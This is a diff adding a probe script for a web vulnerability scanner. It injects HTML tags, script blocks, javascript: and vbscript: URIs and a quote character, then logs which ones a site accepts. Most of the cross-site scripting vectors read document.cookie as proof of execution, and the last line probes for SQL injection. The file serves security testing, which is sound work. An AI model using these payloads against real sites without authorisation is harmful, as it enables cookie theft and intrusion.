@@ -1,0 +1,39 @@
+#
+# Shows some of the basic language syntax see sleuth help file for more
+#
+INJECT '<h1><center>Html Inclusion' LOOKFOR IT LOG 'Allows Html Input'
+IF NOT 'Allows Html Input' THEN GOTO 1
+#
+# Embed, Object, and Script Block Check
+#
+INJECT '<object></object>'  LOOKFOR IT LOG 'Allows Object Blocks'
+INJECT '<embed src=></embed>' LOOKFOR IT LOG 'Allows Embed Src Blocks'
+INJECT '<script></script>' LOOKFOR IT LOG 'Allows Script Blocks'
+#
+# Javascript tests
+#
+INJECT 'javascript:testString' LOOKFOR IT LOG 'javascript: ok'
+INJECT 'vbscript:testString' LOOKFOR IT LOG 'vbscript: ok'
+#
+# Since there is no IF " " AND/OR " " syntax we have to test this way...basically we are saying..
+# IF NOT "javascript: ok" AND NOT "vbscript: ok" THEN skip Js tests
+#
+IF 'javascript: ok' THEN GOTO 2
+IF NOT 'vbscript: ok' THEN GOTO 1
+2
+INJECT '<img src=javascript:>' LOOKFOR IT LOG 'Allow Img Src Scripts'
+INJECT '<img onerror=vbscript:>' LOOKFOR IT LOG 'Allows Img Src Event Handlers'
+INJECT '<link rel=stylesheet href="javascript:window.status=document.cookie">' LOOKFOR IT LOG 'Allows style sheet JS'
+INJECT '<input type=image src=javascript:window.status=document.cookie>' LOOKFOR IT LOG 'Allows Input Img JS'
+INJECT '<bgsound src=javascript:window.status=document.cookie>' LOOKFOR IT LOG 'Allows BgSound JS'
+INJECT '<iframe src="javascript:window.status=document.cookie">' LOOKFOR IT LOG 'Allows Iframe Src JS'
+INJECT '<frameset onload=vbscript:window.status=document.cookie></frameset>' LOOKFOR IT LOG 'Allows FrameEvent Handler JS'
+INJECT '<table background="javascript:window.status=document.cookie"></table>' LOOKFOR IT LOG 'Allows table bgImage JS'
+INJECT '<object type=text/html data="window.status=document.cookie"></object>' LOOKFOR IT LOG 'Allows Object event handler JS'
+INJECT '<body onload="javascript:window.status=document.cookie"></body>' LOOKFOR IT LOG 'Allows Body OnLoad JS'
+INJECT '<body background="javascript:window.status=document.cookie"></body>' LOOKFOR IT LOG 'Allows Body BgImg JS'
+INJECT '<p style=left:expression(window.status=document.cookie)>' LOOKFOR IT LOG 'Allows style expression JS'
+#
+1
+INJECT ";'" LOOKFOR SQLERROR LOG 'Possible Sql Command Insertion Point'
+
